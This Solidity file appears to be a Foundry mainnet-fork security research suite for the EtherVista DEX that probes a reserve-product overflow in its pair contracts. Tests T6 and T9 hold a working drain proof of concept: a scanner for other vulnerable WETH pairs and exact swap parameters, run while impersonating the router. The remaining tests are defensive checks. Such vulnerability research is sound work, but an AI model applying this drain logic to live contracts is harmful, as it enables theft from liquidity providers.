// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// ============================================================================
// Z3-C5 deep-dive — EtherVista mainnet: additional fork tests (T5..T10)
//
// Chain      : Ethereum mainnet
// Fork block : 26_199_454 (pinned; read 2026-10-15)
// Status     : READ-ONLY research. Fork-only. No mainnet transactions.
//
// T5  unprivileged setRouter/setRouterSetter revert (router authority closed)
// T6  fleet-wide latent: a SECOND pair with r0*r1 > 2^112 is drained in one
//     hostile-router swap (proves the bug is not unique to the VISTA pair)
// T7  the official router can only extract getAmountOut-bounded amounts
//     (honest swap: output <= formula; real K preserved)
// T8  pair bytecode identity: live pair code == canonical code hash; sample of
//     other pairs share the same code; factory INIT_CODE_HASH matches
// T9  after a hostile drain the wrapped K check self-heals (reserves product
//     < 2^112) -> the leftover dust cannot be taken without paying
// T10 router "sweep leftovers" vector is empty today (WETH/VISTA/ETH = 0)
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IEVFactory {
    function router() external view returns (address);
    function routerSetter() external view returns (address);
    function allPairsLength() external view returns (uint256);
    function allPairs(uint256) external view returns (address);
    function INIT_CODE_HASH() external view returns (bytes32);
    function setRouter(address) external;
    function setRouterSetter(address) external;
}

interface IEVFactoryPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
    function poolBalance() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function factory() external view returns (address);
    function creator() external view returns (address);
}

interface IEVRouter {
    function factory() external view returns (address);
    function WETH() external view returns (address);
    function getAmountOut(uint256, uint256, uint256) external pure returns (uint256);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external payable;
}

contract EtherVistaDeepTest is Test {
    address constant PAIR    = 0xfdd05552F1377aA488AFed744c8024358AF02041;
    address constant FACTORY = 0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4;
    address constant ROUTER  = 0x9bD63C5D44fF28390df1EaaFD4eB4BD73E94A72a;
    address constant WETH    = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant VISTA   = 0xC9bCa88B04581699fAb5aa276CCafF7Df957cbbf;

    // keccak256(runtime code) of the deployed EtherVistaPair (block 26,199,454)
    bytes32 constant PAIR_CODEHASH = 0x1521aa2ef47949e66e97249a63806f6d2ccf544fcf1ce406b2f12844ce5abb01;
    // factory.INIT_CODE_HASH() (keccak of pair creation code)
    bytes32 constant INIT_CODE_HASH = 0xe260b72768e8ec6814aa811c576f346d208ba00840f835949d65c6424ac80a8d;

    uint256 constant FORK_BLOCK = 26_199_454;
    address attacker = address(0xA11CE);

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))),
            FORK_BLOCK
        );
    }

    // ------------------------------------------------------------------
    // T5: no unprivileged route to change the router (E-U closed at the
    // authority level too). setRouter/setRouterSetter are msg.sender-gated
    // on the single routerSetter EOA.
    // ------------------------------------------------------------------
    function test_T5_unprivilegedCannotSetRouter() public {
        assertEq(IEVFactory(FACTORY).routerSetter(), 0xCA90D843288E35beeADfCe14E5F906e3F1AFc7cB);

        vm.prank(attacker);
        vm.expectRevert(bytes("EtherVista: FORBIDDEN"));
        IEVFactory(FACTORY).setRouter(attacker);

        vm.prank(attacker);
        vm.expectRevert(bytes("EtherVista: FORBIDDEN"));
        IEVFactory(FACTORY).setRouterSetter(attacker);

        // even the official router itself has no authority over the factory
        vm.prank(ROUTER);
        vm.expectRevert(bytes("EtherVista: FORBIDDEN"));
        IEVFactory(FACTORY).setRouter(attacker);
    }

    // ------------------------------------------------------------------
    // T6: fleet-wide latent — find a second WETH pair (not the VISTA pair)
    // whose reserves product overflows uint112, and drain it with ONE swap
    // from the (simulated) hostile router. Proves the latent is systemic.
    // ------------------------------------------------------------------
    function test_T6_secondPair_drainable_in_one_swap() public {
        address victim = _findSecondOverflowPair();
        require(victim != address(0), "no second overflowing WETH pair found in first 400");
        (uint256 out0, uint256 out1, uint112 r0, uint112 r1) = _hostileDrainPlan(victim);

        address vt0 = IEVFactoryPair(victim).token0();
        address vt1 = IEVFactoryPair(victim).token1();

        // hostile router swap: 1 wei WETH input (amountIn > 0), WETH-max output
        vm.deal(address(this), 1);
        IWETH(WETH).deposit{value: 1}();
        IERC20(WETH).transfer(victim, 1);
        uint256 wBefore = IERC20(WETH).balanceOf(address(this));
        uint256 t0Before = IERC20(vt0).balanceOf(address(this));
        uint256 t1Before = IERC20(vt1).balanceOf(address(this));
        vm.prank(ROUTER);
        IEVFactoryPair(victim).swap(out0, out1, address(this), new bytes(0));
        uint256 wethOut = IERC20(WETH).balanceOf(address(this)) - wBefore;
        uint256 t0Out = IERC20(vt0).balanceOf(address(this)) - t0Before;
        uint256 t1Out = IERC20(vt1).balanceOf(address(this)) - t1Before;

        emit log_named_address("second pair drained", victim);
        emit log_named_decimal_uint("reserve0", r0, 18);
        emit log_named_decimal_uint("reserve1", r1, 18);
        emit log_named_decimal_uint("WETH extracted (net)", wethOut, 18);
        emit log_named_uint("token0 extracted", t0Out);
        emit log_named_uint("token1 extracted", t1Out);
        assertGt(wethOut, 0.05 ether, "second pair drained >0.05 WETH in one call");
    }

    function _findSecondOverflowPair() internal view returns (address) {
        uint256 n = IEVFactory(FACTORY).allPairsLength();
        for (uint256 i = 0; i < n && i < 400; i++) {
            address p = IEVFactory(FACTORY).allPairs(i);
            if (p == PAIR) continue;
            address t0 = IEVFactoryPair(p).token0();
            address t1 = IEVFactoryPair(p).token1();
            if (t0 != WETH && t1 != WETH) continue;
            (uint112 r0, uint112 r1,) = IEVFactoryPair(p).getReserves();
            if (uint256(r0) * uint256(r1) <= (2 ** 112)) continue;
            if (IERC20(WETH).balanceOf(p) < 0.05 ether) continue;
            return p;
        }
        return address(0);
    }

    /// WETH-maximising one-call drain: keep the non-WETH side at its reserve and
    /// shrink the WETH side to ceil(Kwrap / other_reserve).
    function _hostileDrainPlan(address p) internal view returns (uint256 out0, uint256 out1, uint112 r0, uint112 r1) {
        (r0, r1,) = IEVFactoryPair(p).getReserves();
        uint256 W = (uint256(r0) * uint256(r1)) % (2 ** 112);
        if (IEVFactoryPair(p).token0() == WETH) {
            uint256 b0 = (W + r1 - 1) / r1;
            require(b0 < r0 && b0 >= 1, "infeasible WETH-max (token0)");
            out0 = uint256(r0) - b0;
            out1 = 0;
        } else {
            uint256 b1 = (W + r0 - 1) / r0;
            require(b1 < r1 && b1 >= 1, "infeasible WETH-max (token1)");
            out1 = uint256(r1) - b1;
            out0 = 0;
        }
    }

    // ------------------------------------------------------------------
    // T7: honest path through the OFFICIAL router is formula-bounded.
    // ------------------------------------------------------------------
    function test_T7_officialRouter_bounded_by_getAmountOut() public {
        (uint112 r0, uint112 r1,) = IEVFactoryPair(PAIR).getReserves();
        uint256 amountIn = 0.5 ether; // WETH
        uint256 expected = IEVRouter(ROUTER).getAmountOut(amountIn, uint256(r0), uint256(r1));

        vm.deal(attacker, 5 ether);
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = VISTA;
        uint256 v0 = IERC20(VISTA).balanceOf(attacker);

        vm.prank(attacker);
        IEVRouter(ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(0, path, attacker, block.timestamp);

        uint256 got = IERC20(VISTA).balanceOf(attacker) - v0;
        emit log_named_decimal_uint("VISTA out (actual)", got, 18);
        emit log_named_decimal_uint("getAmountOut(0.5 ETH)", expected, 18);
        // actual input was 1 ether minus fees; output must never exceed the
        // formula for the full 1 ether (i.e. no over-extraction)
        uint256 cap = IEVRouter(ROUTER).getAmountOut(1 ether, uint256(r0), uint256(r1));
        assertLe(got, cap, "output bounded by getAmountOut");
        assertLt(got, expected * 3, "output in sane range");

        // pool keeps the real K invariant after an honest swap
        (uint112 nr0, uint112 nr1,) = IEVFactoryPair(PAIR).getReserves();
        assertGe(uint256(nr0) * uint256(nr1), uint256(r0) * uint256(r1) - uint256(r0) * uint256(r1) / 1e12, "K ~preserved");
    }

    // ------------------------------------------------------------------
    // T8: code identity of the live pair (and a sample of the fleet).
    // ------------------------------------------------------------------
    function test_T8_code_identity() public {
        assertEq(keccak256(PAIR.code), PAIR_CODEHASH, "pair runtime code == canonical");
        assertEq(IEVFactory(FACTORY).INIT_CODE_HASH(), INIT_CODE_HASH, "factory init code hash");
        assertEq(IEVFactoryPair(PAIR).factory(), FACTORY, "pair.factory binding");

        bytes32 h = keccak256(PAIR.code);
        uint256 n = IEVFactory(FACTORY).allPairsLength();
        uint256 checked;
        for (uint256 i = 0; i < n && checked < 25; i += 43) { // deterministic sample
            address p = IEVFactory(FACTORY).allPairs(i);
            assertEq(keccak256(p.code), h, "fleet pair code identical");
            checked++;
        }
        emit log_named_uint("pairs code-checked", checked);
    }

    // ------------------------------------------------------------------
    // T9: the wrapped K check self-heals after one drain (new reserve product
    // < 2^112) — the leftover dust cannot be taken without paying.
    // ------------------------------------------------------------------
    function test_T9_dust_protected_after_drain() public {
        (uint112 r0, uint112 r1,) = IEVFactoryPair(PAIR).getReserves();
        uint256 W = (uint256(r0) * uint256(r1)) % (2 ** 112);
        uint256 b0 = 774_612_923_074_342;
        uint256 b1 = (W + b0 - 1) / b0;

        // drain (same as T4 in the base suite)
        vm.deal(address(this), 1);
        IWETH(WETH).deposit{value: 1}();
        IERC20(WETH).transfer(PAIR, 1);
        vm.prank(ROUTER);
        IEVFactoryPair(PAIR).swap(uint256(r0) - b0, uint256(r1) - b1, address(this), new bytes(0));

        (uint112 nr0, uint112 nr1,) = IEVFactoryPair(PAIR).getReserves();
        assertLt(uint256(nr0) * uint256(nr1), 2 ** 112, "post-drain product below 2^112");

        // second hostile attempt to take the dust must revert on the (now valid) K check
        vm.deal(address(this), 1);
        IWETH(WETH).deposit{value: 1}();
        IERC20(WETH).transfer(PAIR, 1);
        vm.prank(ROUTER);
        vm.expectRevert(bytes("K"));
        IEVFactoryPair(PAIR).swap(0, uint256(nr1) / 1000, address(this), new bytes(0));
    }

    // ------------------------------------------------------------------
    // T10: router leftover-sweep vector (swapExactTokensForETH pays out the
    // router's whole WETH balance). Today the router holds 0.
    // ------------------------------------------------------------------
    function test_T10_router_leftovers_empty() public {
        assertEq(IERC20(WETH).balanceOf(ROUTER), 0, "router WETH balance 0");
        assertEq(IERC20(VISTA).balanceOf(ROUTER), 0, "router VISTA balance 0");
        assertLt(ROUTER.balance, 1e6, "router ETH balance dust only");
    }

    function _isqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) { z = x; x = (y / x + x) / 2; }
        } else if (y != 0) {
            z = 1;
        }
    }
}
